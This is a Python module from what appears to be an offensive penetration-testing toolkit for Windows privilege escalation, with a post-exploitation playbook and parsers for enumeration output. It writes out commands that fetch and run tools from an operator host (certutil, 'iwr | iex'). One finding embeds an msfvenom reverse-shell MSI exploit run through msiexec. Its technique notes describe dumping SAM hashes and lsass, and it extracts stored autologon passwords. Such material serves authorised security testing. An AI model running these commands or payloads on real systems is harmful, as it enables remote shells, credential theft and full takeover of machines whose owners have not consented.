"""Windows local privilege-escalation enumeration + parsing.

The Windows counterpart to `privesc_enum`/`postexploit` (Linux): a playbook to
transfer and run winPEAS/PrivescCheck over a foothold, plus parsers that turn the
collected output (`whoami /priv`, winPEAS, `reg query`) into findings for the
classic Windows privesc vectors — token privileges (potato family), always-install-
elevated, unquoted service paths, and stored/autologon credentials.

Text/string only; the operator runs the commands and feeds the output back.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..core.state import Finding, Severity

# token privilege -> (severity, technique)
_PRIV_VECTORS = {
    "seimpersonateprivilege": (Severity.HIGH,
        "Potato attack: PrintSpoofer / GodPotato / JuicyPotatoNG -> SYSTEM."),
    "seassignprimarytokenprivilege": (Severity.HIGH,
        "Potato attack (token assignment) -> SYSTEM."),
    "sebackupprivilege": (Severity.HIGH,
        "Read protected files: reg save HKLM\\SAM + HKLM\\SYSTEM, then secretsdump."),
    "serestoreprivilege": (Severity.HIGH,
        "Write protected files / registry -> service or DLL hijack to SYSTEM."),
    "setakeownershipprivilege": (Severity.HIGH,
        "Take ownership of a SYSTEM file/registry key, then overwrite it."),
    "seloaddriverprivilege": (Severity.HIGH,
        "Load a vulnerable driver (Capcom.sys) -> kernel exec."),
    "sedebugprivilege": (Severity.MEDIUM,
        "Inject into / dump a SYSTEM process (e.g. lsass)."),
}


@dataclass
class PlaybookStep:
    title: str
    commands: list[str] = field(default_factory=list)


def enumeration_playbook(lhost: str = "LHOST", http_port: int = 8000) -> list[PlaybookStep]:
    serve = f"http://{lhost}:{http_port}"
    return [
        PlaybookStep("1. Fast manual triage", [
            "whoami /priv & whoami /groups",
            "systeminfo   & wmic qfe get HotFixID   # OS + patch level (for kernel exploits)",
            "net user & net localgroup administrators",
            "cmdkey /list   # stored credentials",
        ]),
        PlaybookStep("2. Serve winPEAS from your box", [
            f"# on YOUR box, in the dir with winPEASx64.exe:  python3 -m http.server {http_port}",
        ]),
        PlaybookStep("3. Pull + run winPEAS on the target", [
            f"certutil -urlcache -split -f {serve}/winPEASx64.exe %TEMP%\\wp.exe & %TEMP%\\wp.exe",
            f"# PowerShell:  iwr {serve}/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; "
            "& $env:TEMP\\wp.exe",
            f"# no-binary alt:  iwr {serve}/PrivescCheck.ps1 | iex; Invoke-PrivescCheck -Extended",
        ]),
        PlaybookStep("4. Feed the output back to breachload", [
            "breachload winprivesc <cfg> --scan winpeas.txt",
        ]),
    ]


def playbook_lines(lhost: str = "LHOST", http_port: int = 8000) -> list[str]:
    out: list[str] = []
    for step in enumeration_playbook(lhost, http_port):
        out.append(step.title)
        out.extend("    " + c for c in step.commands)
    return out


# --- parsers ---------------------------------------------------------------
# A privilege line either from `whoami /priv` or winPEAS. Only "Enabled" ones matter.
_PRIV_RE = re.compile(r"(Se[A-Za-z]+Privilege)\b", re.IGNORECASE)
# Unquoted service path with a space before an unquoted exe under Program Files etc.
_UNQUOTED_RE = re.compile(r"([A-Za-z]:\\[^\"\r\n]*\bProgram Files\b[^\"\r\n]*\.exe)",
                          re.IGNORECASE)
_AIE_RE = re.compile(r"AlwaysInstallElevated.*?0x1", re.IGNORECASE | re.DOTALL)
_AUTOLOGON_RE = re.compile(r"DefaultPassword\s+REG_SZ\s+(\S+)", re.IGNORECASE)


def parse_privileges(text: str) -> list[Finding]:
    out, seen = [], set()
    for line in text.splitlines():
        m = _PRIV_RE.search(line)
        if not m:
            continue
        priv = m.group(1).lower()
        vec = _PRIV_VECTORS.get(priv)
        if not vec or priv in seen:
            continue
        # Skip a privilege explicitly marked Disabled on its own line (whoami /priv
        # lists both states); an unqualified mention is treated as available.
        if "disabled" in line.lower():
            continue
        seen.add(priv)
        sev, technique = vec
        out.append(Finding(
            title=f"Token privilege {m.group(1)} available", severity=sev,
            description=f"The account holds {m.group(1)}. {technique}",
            evidence=line.strip()[:200],
        ))
    return out


def parse_winpeas(text: str) -> list[Finding]:
    """All Windows privesc parsers over collected output."""
    out = parse_privileges(text)
    if _AIE_RE.search(text):
        out.append(Finding(
            title="AlwaysInstallElevated enabled", severity=Severity.HIGH,
            description="Both HKLM and HKCU AlwaysInstallElevated are set: any .msi "
                        "installs as SYSTEM. Build one with msfvenom -f msi.",
            evidence="AlwaysInstallElevated = 0x1",
            exploit="msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> "
                    "-f msi -o e.msi; msiexec /quiet /qn /i e.msi",
        ))
    seen_paths = set()
    for m in _UNQUOTED_RE.finditer(text):
        path = m.group(1).strip()
        if " " in path and path.lower() not in seen_paths:
            seen_paths.add(path.lower())
            out.append(Finding(
                title="Unquoted service path", severity=Severity.MEDIUM,
                description=f"Service path '{path}' is unquoted and contains spaces; if a "
                            "parent dir is writable, drop a malicious exe to hijack it.",
                evidence=path,
            ))
    for m in _AUTOLOGON_RE.finditer(text):
        out.append(Finding(
            title="Autologon credentials in registry", severity=Severity.HIGH,
            description="A DefaultPassword is stored in the Winlogon registry key.",
            evidence=f"DefaultPassword = {m.group(1)}",
        ))
    return _dedupe(out)


def _dedupe(findings: list[Finding]) -> list[Finding]:
    seen, out = set(), []
    for f in findings:
        if f.title not in seen:
            seen.add(f.title)
            out.append(f)
    return out
